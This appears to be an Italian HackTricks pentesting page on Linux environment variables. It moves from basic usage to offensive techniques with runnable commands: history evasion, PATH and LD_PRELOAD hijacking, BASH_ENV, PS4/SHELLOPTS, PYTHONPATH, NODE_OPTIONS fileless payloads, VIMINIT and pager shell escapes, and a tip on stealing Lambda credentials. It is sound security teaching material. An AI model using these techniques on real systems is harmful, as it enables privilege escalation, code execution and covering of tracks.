# Variabili d'ambiente Linux

{{#include ../../banners/hacktricks-training.md}}

## Variabili globali

Le variabili globali **verranno** ereditate dai **processi figli**.

Puoi creare una variabile globale per la sessione corrente con:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Questa variabile sarà accessibile dalle sessioni correnti e dai relativi processi figli.

Puoi **rimuovere** una variabile eseguendo:

```bash
unset MYGLOBAL
```

## Variabili locali

Le **variabili locali** possono essere **consultate** solo dalla **shell/script corrente**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Elencare le variabili correnti

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

I contenuti di `/proc/*/environ` sono **separati da NUL**, quindi queste varianti sono solitamente più facili da leggere:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Se stai cercando **credenziali** o **configurazioni di servizi interessanti** negli ambienti ereditati, consulta anche [Linux Post Exploitation](../post-exploitation/README.md).

## Variabili comuni

Da: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – il display usato da **X**. Questa variabile di solito è impostata su **:0.0**, che indica il primo display del computer corrente.
- **EDITOR** – l’editor di testo preferito dall’utente.
- **HISTFILESIZE** – il numero massimo di righe contenute nel file della cronologia.
- **HISTSIZE** – il numero di righe aggiunte al file della cronologia quando l’utente termina la sessione
- **HOME** – la tua directory home.
- **HOSTNAME** – il nome host del computer.
- **LANG** – la lingua corrente.
- **MAIL** – il percorso dello spool di posta dell’utente. Di solito **/var/spool/mail/USER**.
- **MANPATH** – l’elenco delle directory in cui cercare le pagine del manuale.
- **OSTYPE** – il tipo di sistema operativo.
- **PS1** – il prompt predefinito di bash.
- **PATH** – memorizza i percorsi di tutte le directory che contengono file binari che vuoi eseguire specificando solo il nome del file, senza usare un percorso relativo o assoluto.
- **PWD** – la directory di lavoro corrente.
- **SHELL** – il percorso della shell di comando corrente (ad esempio, **/bin/bash**).
- **TERM** – il tipo di terminale corrente (ad esempio, **xterm**).
- **TZ** – il tuo fuso orario.
- **USER** – il tuo nome utente corrente.

## Variabili interessanti per l’hacking

Non tutte le variabili sono ugualmente utili. Da una prospettiva offensiva, dai la priorità alle variabili che modificano i **percorsi di ricerca**, i **file di avvio**, il **comportamento del linker dinamico** o l’**audit/registrazione**.

### **HISTFILESIZE**

Modifica il **valore di questa variabile impostandolo a 0**, così, quando **termini la sessione**, il **file della cronologia** (\~/.bash_history) verrà **troncato a 0 righe**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Imposta **il valore di questa variabile su 0**, così i comandi **non vengono conservati nella cronologia in memoria** e non vengono scritti nel **file della cronologia** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Se **il valore di questa variabile è impostato su `ignorespace` o `ignoreboth`**, qualsiasi comando preceduto da uno spazio aggiuntivo non verrà salvato nella cronologia.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Imposta il **file della cronologia** su **`/dev/null`** oppure rimuovine completamente l'impostazione. Di solito è più affidabile che modificare solo la dimensione della cronologia.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

I processi useranno il **proxy** dichiarato qui per connettersi a Internet tramite **http o https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy predefinito per gli strumenti/protocolli che lo supportano.
- `no_proxy`: elenco di esclusione (host/domini/CIDR) per le connessioni dirette.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Sia le varianti minuscole che quelle maiuscole possono essere usate a seconda dello strumento (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

I processi si fideranno dei certificati indicati in **queste variabili d'ambiente**. Questo è utile per fare in modo che strumenti come **`curl`**, **`git`**, i client HTTP Python o i gestori di pacchetti si fidino di una CA controllata dall'aggressore (ad esempio, per far sembrare legittimo un proxy di intercettazione).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Se un wrapper/script con privilegi esegue comandi **senza percorsi assoluti**, prevale la **prima directory controllata dall’attaccante** in `PATH`. Questo è il primitivo alla base di molti **PATH hijack** in `sudo`, nei cron job, negli shell wrapper e negli helper SUID personalizzati. Cerca `env_keep+=PATH`, `secure_path` debole o wrapper che chiamano `tar`, `service`, `cp`, `python` e così via usando solo il nome.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Per catene complete di privilege escalation che abusano di `PATH`, consulta [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` non è solo un riferimento a una directory: molti strumenti caricano automaticamente **dotfile**, **plugin** e **configurazioni per utente** da `$HOME` o `$XDG_CONFIG_HOME`. Se un flusso di lavoro privilegiato mantiene questi valori, la **config injection** può essere più semplice del **binary hijacking**.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Obiettivi interessanti includono `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` e file specifici degli strumenti come `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Queste variabili influenzano il **dynamic linker**:

- `LD_PRELOAD`: forza il caricamento anticipato di ulteriori oggetti condivisi.
- `LD_LIBRARY_PATH`: antepone directory di ricerca delle librerie.
- `LD_AUDIT`: carica librerie auditor che osservano il caricamento delle librerie e la risoluzione dei simboli.

Sono estremamente utili per **hooking**, **instrumentation** e **privilege escalation** se un comando privilegiato le mantiene. In modalità **secure-execution** (`AT_SECURE`, ad esempio con setuid/setgid/capabilities), il loader rimuove o limita molte di queste variabili. Tuttavia, i bug del parser in questa fase iniziale del loader hanno comunque un impatto elevato, perché si verificano **prima** del programma di destinazione.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifica il comportamento iniziale di glibc (per esempio, i parametri configurabili dell’allocator) ed è molto utile nei laboratori di exploit. È importante anche dal punto di vista della sicurezza, perché il **dynamic loader la analizza molto presto**. La vulnerabilità **Looney Tunables** del 2023 ha ricordato che una singola variabile d’ambiente analizzata dal loader può diventare una **primitiva di escalation dei privilegi locale** contro programmi SUID.<sup>[[6]](#references)</sup>

Per CVE-2023-4911, confronta la **release del pacchetto della distribuzione installato** con la release corretta del relativo vendor e verifica quale loader viene effettivamente usato per i nuovi processi. La sola stringa della versione upstream non è affidabile: Debian ha retroportato il parser vulnerabile nel suo pacchetto 2.31, mentre altre distribuzioni hanno retroportato le correzioni senza modificare il numero upstream. Una transizione di privilegi concreta richiede anche un eseguibile privilegiato il cui cambio d’identità non sia bloccato da `NoNewPrivs`, da un mount `nosuid` o da un’altra mitigazione. Evita di eseguire una sonda che provochi un crash con `GLIBC_TUNABLES` malformata durante l’enumerazione passiva. Consulta il [tracker di Ubuntu](https://ubuntu.com/security/CVE-2023-4911), il [tracker di Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) e l’[avviso di Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) per verificare l’applicabilità alle singole release; anche l’[avviso di sicurezza](https://ubuntu.com/security/notices/USN-6409-1) di Ubuntu raccomanda di riavviare dopo l’aggiornamento.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Se **Bash** viene avviato **non interattivamente**, controlla `BASH_ENV` e carica quel file prima di eseguire lo script di destinazione. Quando Bash viene invocato come `sh` o in modalità interattiva in stile POSIX, può consultare anche `ENV`. È un metodo classico per trasformare uno shell wrapper in code execution se l'ambiente è controllato dall'attaccante.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignora questi file di avvio quando gli **ID reali/effettivi differiscono**; `-p` preserva l’ID effettivo ma non abilita quei file di avvio, quindi il comportamento esatto dipende da come il wrapper avvia la shell. Fai attenzione ai wrapper privilegiati che chiamano `setuid()`/`setgid()` **prima** di avviare Bash: una volta che gli ID tornano a coincidere, Bash potrebbe considerare attendibili `BASH_ENV`, `ENV` e lo stato correlato della shell, che altrimenti verrebbero ignorati.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Quando Bash viene eseguito con **xtrace** abilitato, espande `PS4` e lo stampa prima di ogni comando tracciato. `PS4` viene espanso come un prompt, quindi al suo interno viene eseguita una **sostituzione di comando**. È fondamentale che xtrace possa essere attivato direttamente dall’ambiente esportando `SHELLOPTS=xtrace`: non serve `-x` sulla riga di comando, quindi qualsiasi script Bash eseguito dalla vittima consente l’esecuzione di codice.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` non fa nulla finché xtrace non è attivo (`SHELLOPTS=xtrace`, `set -x` o `bash -x`), e Bash elimina `SHELLOPTS` nei contesti privilegiati/setuid proprio come `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Queste variabili modificano l'avvio di Python:

- `PYTHONPATH`: antepone percorsi di ricerca per gli import.
- `PYTHONHOME`: ricolloca l'albero della libreria standard.
- `PYTHONSTARTUP`: esegue un file prima del prompt interattivo.
- `PYTHONINSPECT=1`: avvia la modalità interattiva al termine di uno script.
- `PYTHONBREAKPOINT`: invoca `package.module.callable` (e importa il relativo modulo) quando il codice raggiunge `breakpoint()`.<sup>[[8]](#references)</sup>

Sono utili contro script di manutenzione, debugger, shell e wrapper che eseguono Python con un ambiente controllabile. `python -E` e `python -I` ignorano tutte le variabili `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Un recente esempio reale è stato il LPE di **needrestart** del 2024 sui sistemi Ubuntu/Debian: lo scanner di proprietà di root copiava `PYTHONPATH` di un processo non privilegiato da `/proc/<PID>/environ` e poi eseguiva Python. L'exploit pubblicato inseriva `importlib/__init__.so` nel percorso controllato dall'attaccante, così Python eseguiva codice dell'attaccante durante la propria inizializzazione, prima ancora che lo script hard-coded dell'helper avesse importanza.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ha variabili di avvio altrettanto utili:

- `PERL5LIB`: antepone directory di librerie.
- `PERL5OPT`: inietta opzioni come se fossero presenti nella riga di comando di ogni comando `perl`.

Questo può forzare il **caricamento automatico dei moduli** o modificare il comportamento dell'interprete prima che lo script di destinazione faccia qualcosa di interessante. Perl ignora queste variabili nei contesti **taint / setuid / setgid**, ma restano comunque molto importanti per wrapper eseguiti come root, job CI, installer e regole sudoers personalizzate.

Se una regola sudo consente override dell'ambiente e il comando privilegiato avvia infine Perl, controlla anche `PERL5DB`. Perl documenta che `PERL5OPT=-d` avvia il debugger e che `PERL5DB` fornisce il codice di inizializzazione del debugger quando Perl si avvia con una semplice opzione `-d`. Rimuovere solo `PERL5LIB` e `PERLLIB` non elimina questa possibilità. Le variabili devono sopravvivere a sudo e al wrapper, e il processo Perl non deve ignorarle per via della gestione taint o set-ID; esamina la regola esatta e la catena di esecuzione senza eseguire l'helper privilegiato durante l'enumerazione. Vedi il [riferimento alle variabili d'ambiente di perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Il percorso di ricerca integrato di Perl [`@INC`](https://perldoc.perl.org/perlvar#@INC) è un altro confine di fiducia per i moduli, anche senza variabili d'ambiente mantenute. Per un processo Perl privilegiato, verifica la corrispondenza tra un'istruzione `use` o `require` effettiva, il nome del modulo risolto, l'ordine di ricerca e la possibilità per un utente con privilegi inferiori di creare o sostituire quel modulo in una directory esaminata. La sola presenza di una directory di librerie scrivibile non dimostra che il processo privilegiato caricherà codice da lì.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` antepone **flag CLI di Node.js** a ogni processo `node` che eredita l'ambiente. Questo lo rende utile contro wrapper, job CI, helper di Electron e regole sudo che, prima o poi, avviano Node. In genere, i flag più interessanti in ambito offensivo sono:

- `--require <file>`: carica un file CommonJS prima dello script target.
- `--import <module>`: carica un modulo ES prima dello script target.

Node rifiuta alcuni flag pericolosi in `NODE_OPTIONS`, ma `--require` e `--import` sono esplicitamente consentiti e vengono elaborati **prima** dei normali argomenti della riga di comando.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload fileless con un URL `data:`

Quando puoi impostare `NODE_OPTIONS` ma **non puoi scrivere un file** sul target (filesystem in sola lettura, API con restrizioni, runtime serverless, ecc.), `--import` accetta un URL `data:text/javascript,`, quindi l'intero payload è contenuto nella variabile d'ambiente stessa. Il JavaScript deve essere **codificato completamente in formato URL**: Node interpreta il valore come un URL, quindi qualsiasi spazio non codificato (o altro carattere non codificato) tronca il payload e genera un `SyntaxError`. Funziona su Node 20.6+ dove `--import` è nell'allowlist di `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Questo è un metodo comune per trasformare il controllo di `NODE_OPTIONS` in RCE nei **runtime cloud gestiti** le cui funzioni eseguono Node. Per esempio, un attacker che può solo modificare la configurazione di una Lambda (`lambda:UpdateFunctionConfiguration`, senza `iam:PassRole` né aggiornamenti del codice) può iniettare `NODE_OPTIONS=--import data:text/javascript,<payload>` per eseguire codice all'interno della funzione e sottrarre le credenziali del suo execution role. Il modulo iniettato viene eseguito **prima** dell'handler, che poi continua a essere eseguito normalmente.

Per le catene di gadget remote che impostano indirettamente `NODE_OPTIONS` (per esempio, da prototype pollution a RCE), consulta [questa altra pagina](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby offre la stessa categoria di abusi all'avvio:

- `RUBYLIB`: antepone directory al load path di Ruby.
- `RUBYOPT`: inietta opzioni da riga di comando come `-r` in ogni invocazione di `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Le vulnerabilità di **needrestart** del 2024 hanno dimostrato che non si tratta solo di un trucco da lab: lo stesso helper di proprietà di root, vulnerabile agli abusi di `PYTHONPATH`, poteva anche essere indotto a eseguire Ruby con un `RUBYLIB` controllato dall'attaccante, caricando `enc/encdb.so` da una directory dell'attaccante.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim eseguono i comandi Ex contenuti in `VIMINIT` (o nella variabile di fallback `EXINIT`) durante un normale avvio. I comandi Ex includono `:!cmd` e `:call system(...)`, quindi controllare la variabile consente il code execution ogni volta che una vittima apre Vim (un `sudo vim` eseguito come root, `crontab -e`, `visudo`, `git`/`less` che avviano `$EDITOR`, ecc.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

La modalità batch (`vim -es`/`-Es`) ignora queste variabili, ma un normale avvio interattivo le esegue.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) funziona su Linux/macOS (e Windows) ed è un'**applicazione .NET**, quindi diverse variabili d'ambiente possono trasformare qualsiasi invocazione di `pwsh` con un ambiente ereditato in code execution: un vettore utile contro job cron/systemd, runner CI e wrapper privilegiati che richiamano `pwsh`.

- `PSModulePath`: PowerShell cerca ricorsivamente in ogni directory di questo elenco i moduli `.psd1`/`.psm1` e ne **carica automaticamente** uno la prima volta che viene richiamato un comando che esporta. Anteponi una directory e il codice di primo livello del tuo modulo viene eseguito al momento dell'importazione; poiché la risoluzione segue l'ordine *Alias → Function → Cmdlet*, una funzione esportata può persino sovrascrivere un cmdlet integrato richiamato dalla vittima.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: reindirizza a `powershell/Microsoft.PowerShell_profile.ps1`, eseguito all'avvio (a meno che non venga specificato `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly gestito il cui `StartupHook.Initialize()` viene eseguito prima di `Main` (condiviso da tutte le app .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: l'API di profilazione CLR carica una libreria dell'attaccante nel processo all'avvio (le variabili di percorso prevalgono sul registry; `DOTNET_*` è l'alias più recente). In Windows PowerShell 5.1 (.NET Framework) usa `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Su Windows, `PSExecutionPolicyPreference=Bypass` rimuove inoltre la protezione che blocca gli "script non firmati", consentendo l'esecuzione di un profilo/modulo inserito. Consulta la pagina dedicata per i PoC completi:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Alcuni strumenti non si limitano a leggere un percorso dall'ambiente: passano il valore a una **shell**, a un **editor** o a un **preprocessore di input**. Questo rende le seguenti variabili particolarmente interessanti quando un wrapper con privilegi esegue `git`, `man`, `less` o visualizzatori di testo simili:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: scelgono il comando del pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: scelgono il comando dell'editor, spesso con argomenti.
- `LESSOPEN`, `LESSCLOSE`: definiscono preprocessori/postprocessori eseguiti quando `less` apre un file.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git supporta anche l'iniezione della configurazione solo tramite variabili d'ambiente, senza toccare il disco, usando `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` e `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Dal punto di vista della post-exploitation, ricorda anche che gli ambienti ereditati spesso contengono **credenziali**, **impostazioni proxy**, **token di servizio** o **chiavi cloud**. Consulta [Linux Post Exploitation](../post-exploitation/README.md) per cercare `/proc/<PID>/environ` e `Environment=` di `systemd`.

### PS1

Modifica l’aspetto del prompt.

[**Questo è un esempio**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Questo è un esempio](<../images/image (897).png>)

Utente normale:

![PERL5OPT & PERL5LIB - PS1: Uno, due e tre job in background](<../images/image (740).png>)

Uno, due e tre job in background:

![PERL5OPT & PERL5LIB - PS1: Uno, due e tre job in background](<../images/image (145).png>)

Un job in background, uno sospeso e l’ultimo comando non è stato completato correttamente:

![PERL5OPT & PERL5LIB - PS1: Un job in background, uno sospeso e l’ultimo comando non è stato completato correttamente](<../images/image (715).png>)

## References

- [1] [Manuale GNU Bash - File di avvio di Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentazione CLI di Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variabili d’ambiente comuni - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Escalation locale dei privilegi in ld.so di glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manuale GNU Bash - Variabili Bash (`PS4`) e builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Funzione integrata breakpoint() e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentazione di Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath e caricamento automatico dei moduli PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Impostazioni di configurazione per il debug e la profilazione di .NET (variabili del profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
